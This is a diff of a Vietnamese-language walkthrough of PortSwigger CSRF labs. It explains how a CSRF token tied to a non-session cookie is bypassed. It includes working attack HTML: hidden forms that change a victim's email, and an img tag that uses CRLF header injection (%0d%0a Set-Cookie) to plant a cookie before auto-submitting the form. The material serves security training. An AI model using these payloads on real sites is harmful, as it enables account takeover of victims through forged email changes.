@@ -50,6 +50,12 @@ Ta sẽ đi sâu vấn đề hơn và làm bài lab của từng phần:
 
 ## Bypassing CSRF token validation
 
+Trước hết để có thể thực hiện được 1 cuộc tấn công csrf, ta cần có các điều kiện sau:
++ relevant action: phải có 1 hành động liên quan, cụ thể trong các bài lab này là việc thay đổi email người dùng ( ví dụ chẳng hạn ta có thể thực hiện được việc thay đội email của người dùng, thì nó có thể gây ra tác động đáng kể đối với khác hàng hoặc người dùng nạn nhân, cụ thể thì khi có email thì ta có thể sử dụng chức năng quên mật khẩu để đặt lại tài khoản người dùng và khi đó thì email nhận được thông báo sẽ là của ta thay vì của nạn nhân, tất nhiên thì đây là bài lab nên ví dụ của nó là ảnh hưởng rất nhỏ vậy, còn trên thực tế thì nó có thể dùng nhiều mục đích khác hơn tùy vào chức năng của trang nữa)
+
++ Thứ 2 là cookie-based session handling: ứng dụng sẽ sử dụng session cookie để thực hiện xử lí phiên.
++ No unpredictable request parameters: ở đây ta sẽ có chủ yếu 2 tham số để tấn công là csrf và email, với tham số email thì ta biết được vì là tham số để ta tấn công, còn csrf là mã ngẫu nhiên kh đoán trước được, nhưng ta có thể dựa vào cách web triển khai để khai thác nó cho hợp lí.
+
 ### [1. CSRF where token validation depends on request method](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method)
 
 Bài lab này mô phỏng việc website xác thực csrf token phục thuộc vào phương thức yêu cầu: 
@@ -131,17 +137,42 @@ vào phần account, change-email và ta bắt burp-suite xem:
 ![image](https://user-images.githubusercontent.com/104350480/225237551-8e08dfed-ad5c-4ba6-b5e5-878d67aa0634.png)
 
 Có thêm đối tượng mới xuất hiện là csrfKey cookie, bên cạnh cái csrf token như các bài lab trước. 
-Ở đây thay đổi tự do cái csrf token hay csrfKey cookie thì cũng sẽ không thu được gì và chỉ trả về invalid csrf token. Nhưng có điều đáng chú ý là nó khi thay đổi csrfKey thì nó không có báo lỗi ảnh hưởng gì đến cookie session, nên có thể thấy là csrfKey đang bị buộc nhầm chỗ.
+Ở đây thay đổi tự do cái csrf token hay csrfKey cookie thì cũng sẽ không thu được gì và chỉ trả về invalid csrf token. Nhưng có điều đáng chú ý là nó khi thay đổi csrfKey thì nó không có báo lỗi ảnh hưởng gì đến cookie session, nên có thể thấy là csrfKey đang bị buộc nhầm chỗ. Nhưng mà có thể thấy là cái csrf và csrfKey có liên kết với nhau.
 
 Ta mở thêm tài khoản của carlos và tráo đổi 2 thành phần của 2 bên cho nhau thì thấy vẫn có thể thay đổi được email bình thường như bài lab trên. 
-Và cái csrfKey này là cố định chỉ có csrf token bị thay đổi nên ta sẽ dàn dựng tấn công như sau: 
+Và cái csrfKey này là cố định chỉ có csrf token bị thay đổi. Do đó để tấn công được ta cần phải tiêm được cookie http có tên là csrfKey và chèn cookie của riêng chúng ta vào, và thực hiện tương tự như các bài lab trên. Hay cụ thể hơn bước quan trọng ở đây là thực hiện được http header theo ý mình muốn là csrfKey = với giá trị ta được cấp, thì ở đây ý tưởng là ta sẽ tiêm http header thông qua th search và sau đó server sẽ lấy giá trị của CSRF token từ HTTP header và sử dụng giá trị đó để xác thực request. 
+Ở đây ta nhúng img vào với %0d%0a để tiêm vào http header và onerror để load form vì src ta cấp cho img lỗi là chắc với kí tự kia rồi. Cái chỗ csrfKey thì thực ra mình cũng chưa hiểu lắm, mình đang hiểu là ở đây tiêm 1 http header vào hay chèn cookie csrfKey vào và dựa vào phản hồi http header từ máy chủ rồi trình duyệt sẽ xử lý đó như là một phần của phản hồi và lưu trữ nó vào cookie trên máy tính của người dùng điều này sẽ được lưu trữ trên trình duyệt của nạn nhân khi họ truy cập trang web.
+
+Cụ thể đầu tiên ta sẽ làm như sau: 
+
+![image](https://user-images.githubusercontent.com/104350480/225388346-1bc3adaf-c9c6-447d-891d-c4cee226f3a3.png)
+
+Bên server đã chấp nhận, sau đó ta sẽ thực hiện tương tự như các bài lab trước, như đã nói ở trên ta cần nhúng csrfKey vào nên ta sẽ thực hiện bằng cách dùng img: 
 
 ```
-    <form method="POST" action="https://0a710093043d2ec2c415d20700be0075.web-security-academy.net/my-account/change-email" >
-      <input type="hidden" name="email" value="1manhhuy2002@gmail.com" />
-      <input type="hidden" name="csrf" value="Xs7dJWL7tw1a1xPD1Hkw1cMXlZJ3BNGS" />
-      <input type="submit" value="Submit request" />
-    </form>
-<img src="https://0a710093043d2ec2c415d20700be0075.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=oOuXqmhVhMGrJCSP7oTLu7ypF8roXQzh%3b%20SameSite=None" onerror="document.forms[0].submit()">
+      <form method="POST" action="https://0a710093043d2ec2c415d20700be0075.web-security-academy.net/my-account/change-email" >
+        <input type="hidden" name="email" value="1manhhuy2002@gmail.com" />
+        <input type="hidden" name="csrf" value="Xs7dJWL7tw1a1xPD1Hkw1cMXlZJ3BNGS" />
+        <input type="submit" value="Submit request" />
+      </form>
+  <img src="https://0a710093043d2ec2c415d20700be0075.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=oOuXqmhVhMGrJCSP7oTLu7ypF8roXQzh%3b%20SameSite=None" onerror="document.forms[0].submit()">
 
 ```
+
+lab5: 
+
+Bài này là 1 ví dụ đơn giản hơn chall trước nhưng ý tưởng vẫn thế, ta chỉ cần thay csrfKey ở bài trước thành csrf ở bài này, đặc biệt là giá trị csrf ở đây được tùy chỉnh miễn là 2 cái giống nhau là được nên ta có thể dùng script như bên dưới để thực hiện luôn: 
+
+![image](https://user-images.githubusercontent.com/104350480/225396472-35577f21-547e-4e81-af60-d2552a4871a6.png)
+
+
+```
+<form method='POST' action='https://0a01002a041ea7e0c15ae5bf00e7008c.web-security-academy.net/my-account/change-email'>
+<input type='hidden' name='email' value='manhhuy2002@gmail.com'>
+<input type='hidden' name='csrf' value='test'>
+<input type='submit'>
+</form>
+<img src="https://0a01002a041ea7e0c15ae5bf00e7008c.web-security-academy.net/?search=abcd%0d%0aSet-Cookie:%20csrf=test%3b%20SameSite=None"
+ onerror="document.forms[0].submit()">
+ 
+ ```
